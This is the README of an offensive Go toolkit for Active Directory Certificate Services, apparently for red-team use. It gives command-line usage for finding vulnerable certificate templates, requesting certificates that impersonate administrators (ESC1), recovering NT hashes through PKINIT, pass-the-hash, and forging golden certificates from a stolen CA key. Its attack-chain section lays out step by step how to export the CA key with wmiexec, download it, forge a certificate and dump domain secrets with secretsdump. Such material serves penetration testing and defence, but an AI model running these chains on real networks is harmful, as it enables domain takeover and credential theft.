# Goertipy

<p align="center">
  <img src="goertipy.jpg" alt="Goertipy" width="300">
</p>

An Active Directory Certificate Services (AD CS) enumeration and exploitation toolkit written in Go. Inspired by [Certipy](https://github.com/ly4k/Certipy), designed for portability and performance.

## Features

- **AD CS Enumeration** — Discover CAs, certificate templates, and detect ESC1–ESC4, ESC6–ESC9, ESC13, ESC15
- **Certificate Enrollment** — Request certs via RPC (ICertPassage), HTTP/HTTPS (certsrv), or SMB named pipe
- **PKINIT Authentication** — Authenticate with certificates, recover NT hashes (UnPAC-the-Hash)
- **Certificate Inspection** — Inspect PFX/PEM certificates locally (subject, EKUs, SANs, key size)
- **CA Backup** — Fetch CA public certificate from LDAP
- **Golden Certificate Forgery** — Forge certs as any user using a stolen CA private key
- **Security Descriptor Parsing** — Full Windows ACL/ACE/SID parsing with permission analysis
- **Pass-the-Hash** — NTLM hash authentication on all commands via `--hashes LM:NT`
- **Library-First Design** — All functionality available as importable Go packages

## Installation

```bash
go install github.com/ineffectivecoder/goertipy/cmd/goertipy@latest
```

Or build from source:

```bash
git clone https://github.com/ineffectivecoder/goertipy.git
cd goertipy
go build -o goertipy ./cmd/goertipy
```

## Commands

| Command | Description |
|---------|-------------|
| `find` | Enumerate CAs and templates, detect ESC vulnerabilities |
| `req` | Request certificates (RPC / pipe / HTTP) |
| `auth` | PKINIT authentication → TGT + NT hash |
| `cert show` | Inspect PFX/PEM certificate details |
| `ca backup` | Backup CA public certificate from LDAP |
| `forge` | Golden certificate forgery |

## Usage

### Find (Enumerate AD CS)

```bash
# Basic enumeration
goertipy find -u user@corp.local --dc-ip 10.0.0.1

# With NTLM hash (pass-the-hash)
goertipy find -u administrator -d corp.local --dc-ip 10.0.0.1 -H :aabbccdd11223344

# Only vulnerable templates
goertipy find -u user@corp.local --dc-ip 10.0.0.1 --vulnerable

# JSON output
goertipy find -u user@corp.local --dc-ip 10.0.0.1 --json
```

| Flag | Short | Description |
|------|-------|-------------|
| `--username` | `-u` | Username (user@domain or DOMAIN\user) |
| `--password` | `-p` | Password (prompted if omitted) |
| `--hashes` | `-H` | NTLM hash (LM:NT or :NT) |
| `--domain` | `-d` | Target domain |
| `--dc-ip` | | Domain Controller IP |
| `--scheme` | | LDAP scheme: `ldap` or `ldaps` (default: ldaps) |
| `--json` | | JSON output |
| `--no-color` | | Disable colored output |
| `--vulnerable` | | Show only vulnerable templates |
| `--enabled` | | Show only enabled templates |
| `--hide-admins` | | Hide default admin permissions |
| `--verbose` | `-v` | Verbose output |
| `--debug` | | Debug output |
| `--output` | `-o` | Output file prefix |

---

### Req (Request Certificates)

Three transport options for enrollment:

```bash
# Request via RPC (default — resolves endpoint via EPM on port 135)
goertipy req -u user@corp.local --dc-ip 10.0.0.1 --ca 'corp-CA' --template User

# Request via SMB named pipe (port 445, no EPM needed)
goertipy req -u user@corp.local --dc-ip 10.0.0.1 --ca 'corp-CA' --template User --pipe

# Request via HTTP/HTTPS (certsrv web enrollment)
goertipy req -u user@corp.local --web http://ca.corp.local --ca 'corp-CA' --template User

# ESC1 — Request cert with UPN SAN override
goertipy req -u user@corp.local --dc-ip 10.0.0.1 --ca 'corp-CA' \
  --template VulnTemplate --upn administrator@corp.local

# Retrieve a pending certificate (works with all transports)
goertipy req -u user@corp.local --dc-ip 10.0.0.1 --ca 'corp-CA' --retrieve 42
```

| Flag | Short | Description |
|------|-------|-------------|
| `--ca` | | CA name (e.g., `corp-CA`) |
| `--template` | | Certificate template name |
| `--dc-ip` | | CA server IP (for RPC/pipe transport) |
| `--web` | | HTTP/HTTPS enrollment URL (e.g., `http://ca.corp.local`) |
| `--pipe` | | Use SMB named pipe transport (port 445) |
| `--username` | `-u` | Username |
| `--password` | `-p` | Password (prompted if omitted) |
| `--hashes` | `-H` | NTLM hash (LM:NT or :NT) |
| `--domain` | `-d` | Target domain |
| `--upn` | | UPN SAN override (for ESC1) |
| `--dns` | | DNS SAN override |
| `--subject` | | Certificate subject CN |
| `--retrieve` | | Retrieve pending cert by request ID |
| `--key-size` | | RSA key size (default: 2048) |
| `--output` | `-o` | Output file prefix |
| `--debug` | | Debug output |

---

### Auth (PKINIT Authentication)

Authenticate with a certificate and recover the NT hash — combines `gettgtpkinit` + `getnthash` into one command:

```bash
# Authenticate with PFX and recover NT hash
goertipy auth -u administrator@corp.local --dc-ip 10.0.0.1 --pfx admin.pfx

# Skip NT hash recovery
goertipy auth -u administrator@corp.local --dc-ip 10.0.0.1 --pfx admin.pfx --no-hash

# Custom output path
goertipy auth -u administrator@corp.local --dc-ip 10.0.0.1 --pfx admin.pfx -o admin.ccache

# Base64-encoded PFX (useful for scripting)
goertipy auth -u admin@corp.local --dc-ip 10.0.0.1 --pfx-base64 "MIIJ..."
```

| Flag | Short | Description |
|------|-------|-------------|
| `--pfx` | | PFX/PKCS12 certificate file |
| `--pfx-pass` | | PFX password (default: empty) |
| `--pfx-base64` | | PFX as base64 string |
| `--dc-ip` | | Domain Controller IP |
| `--username` | `-u` | Username (user@domain or DOMAIN\user) |
| `--domain` | `-d` | Target domain |
| `--output` | `-o` | Output ccache filename |
| `--no-hash` | | Skip NT hash recovery (U2U) |
| `--verbose` | `-v` | Verbose output |
| `--debug` | | Debug output |

---

### Cert (Certificate Inspection)

```bash
# Inspect a PFX certificate
goertipy cert show certificate.pfx

# With password-protected PFX
goertipy cert show encrypted.pfx --pfx-pass mypassword

# Inspect a PEM certificate
goertipy cert show ca-cert.pem
```

Displays: Subject, Issuer, Serial, Validity, Signature Algorithm, Public Key (algorithm + size), Key Usage, Extended Key Usages, SANs, and CA chain.

| Flag | Short | Description |
|------|-------|-------------|
| `--pfx-pass` | | PFX password |

---

### CA (Certificate Authority Management)

```bash
# Backup CA certificate from LDAP
goertipy ca backup --ca 'corp-CA' -u user@corp.local --dc-ip 10.0.0.1

# List all CAs (omit --ca to enumerate all)
goertipy ca backup -u user@corp.local --dc-ip 10.0.0.1

# With pass-the-hash
goertipy ca backup --ca 'corp-CA' -u administrator -d corp.local --dc-ip 10.0.0.1 -H :aabbccdd11223344
```

| Flag | Short | Description |
|------|-------|-------------|
| `--ca` | | CA name (optional — lists all if omitted) |
| `--dc-ip` | | Domain Controller IP |
| `--username` | `-u` | Username |
| `--password` | `-p` | Password |
| `--hashes` | `-H` | NTLM hash (LM:NT or :NT) |
| `--domain` | `-d` | Target domain |
| `--scheme` | | LDAP scheme: `ldap` or `ldaps` (default: ldaps) |
| `--output` | `-o` | Output PEM filename |

---

### Forge (Golden Certificate)

Forge a certificate as any user using a stolen CA private key. The forged cert can be used with `goertipy auth` for PKINIT authentication.

```bash
# Forge a cert as administrator using stolen CA PFX
goertipy forge --ca-pfx stolen-ca.pfx --ca-pfx-pass BackupPassword --upn administrator@corp.local

# Using PEM cert + key pair
goertipy forge --ca-cert ca.pem --ca-key ca.key --upn administrator@corp.local

# Custom validity and output
goertipy forge --ca-pfx ca.pfx --upn admin@corp.local --validity 30 -o golden.pfx
```

| Flag | Short | Description |
|------|-------|-------------|
| `--ca-pfx` | | CA certificate + key as PFX file |
| `--ca-pfx-pass` | | PFX password |
| `--ca-cert` | | CA certificate (PEM) |
| `--ca-key` | | CA private key (PEM) |
| `--upn` | | UPN SAN for forged cert |
| `--dns` | | DNS SAN for forged cert |
| `--subject` | | Subject CN (default: derived from UPN) |
| `--serial` | | Serial number (default: random) |
| `--validity` | | Validity in days (default: 365) |
| `--key-size` | | RSA key size (default: 2048) |
| `--output` | `-o` | Output PFX filename |

---

## Attack Chains

### ESC1 — Enrollee Supplies Subject

```bash
# 1. Find vulnerable templates
goertipy find -u user@corp.local --dc-ip 10.0.0.1 --vulnerable

# 2. Request cert with admin UPN
goertipy req -u user@corp.local --dc-ip 10.0.0.1 --ca 'corp-CA' \
  --template VulnTemplate --upn administrator@corp.local

# 3. Authenticate and recover NT hash
goertipy auth -u administrator@corp.local --dc-ip 10.0.0.1 \
  --pfx corp-CA_VulnTemplate.pfx
```

### Golden Certificate — Full Chain

```bash
# 1. Export CA private key on the CA server (requires DA)
wmiexec.py 'domain/admin:password@CA-IP' 'certutil -p BackupPass -backupKey C:\Windows\Temp\cakey'

# 2. Download the PFX via SMB
smbclient.py 'domain/admin:password@CA-IP'
# > use C$
# > cd Windows/Temp/cakey
# > get CA-Name.p12

# 3. Forge a golden cert
goertipy forge --ca-pfx CA-Name.p12 --ca-pfx-pass BackupPass --upn administrator@corp.local

# 4. Authenticate → TGT + NT hash
goertipy auth -u administrator@corp.local --dc-ip 10.0.0.1 \
  --pfx forged_administrator_corp.local.pfx

# 5. Use the NT hash
secretsdump.py -hashes :NT_HASH corp.local/administrator@10.0.0.1
```

## Transport Options

| Transport | Flag | Port | Description |
|-----------|------|------|-------------|
| RPC/TCP | `--dc-ip` (default) | 135 + dynamic | EPM endpoint resolution, then direct TCP |
| Named Pipe | `--dc-ip` + `--pipe` | 445 | SMB pipe `\pipe\cert`, no EPM needed |
| HTTP/HTTPS | `--web URL` | 80/443 | certsrv/certfnsh.asp with NTLM auth |

## Vulnerability Detection

| ESC | Description | Detection Method |
|-----|-------------|------------------|
| ESC1 | Enrollee supplies subject + auth EKU + no approval | Template flags |
| ESC2 | No EKU / Any Purpose + no approval | Template EKU list |
| ESC3 | Certificate Request Agent EKU | Template EKU list |
| ESC4 | Dangerous template ACL permissions | Security descriptor |
| ESC6 | EDITF_ATTRIBUTESUBJECTALTNAME2 on CA | CA flags |
| ESC7 | ManageCA / ManageCertificates by low-priv users | CA security descriptor |
| ESC8 | HTTP enrollment endpoints | CA enrollment servers |
| ESC9 | No security extension + enrollee supplies subject | Template flags |
| ESC13 | Issuance policies linked to groups | msPKI-RA-Policies |
| ESC15 | Schema v1 + enrollee supplies subject | Template schema/flags |

## Project Structure

```
goertipy/
├── cmd/goertipy/         # CLI entry point
├── docs/                 # Deep dive documentation with protocol diagrams
├── internal/commands/    # Cobra command definitions (find, req, auth, cert, ca, forge)
└── pkg/
    ├── adcs/             # AD CS enrollment (RPC, HTTP, pipe), enumeration, vuln detection
    │   └── flags/        # Certificate template and EKU constants
    ├── cert/             # Key generation, CSR creation, PFX handling
    ├── ldap/             # LDAP client, SID resolution
    ├── log/              # Structured logger
    ├── output/           # Text (colored) and JSON formatters
    └── security/         # Windows security descriptor parsing
```

## Testing

```bash
go test ./... -v
```

## Documentation

See [docs/DEEP_DIVE.md](docs/DEEP_DIVE.md) for protocol flow diagrams and technical internals of every command.

## References

- [Certified Pre-Owned (SpecterOps)](https://posts.specterops.io/certified-pre-owned-d95910965cd2)
- [Certipy](https://github.com/ly4k/Certipy)
- [ESC13 — Issuance Policy Abuse](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53)
- [Microsoft AD CS Documentation](https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/)
- [MS-ICPR — ICertPassage Remote Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-icpr/)
- [MS-WCCE — Certificate Enrollment Web Service](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-wcce/)
- [RFC 4556 — PKINIT](https://www.rfc-editor.org/rfc/rfc4556)

## Acknowledgements

This project was developed using [Claude Opus 4.6](https://www.anthropic.com/claude) by Anthropic.

## License

MIT
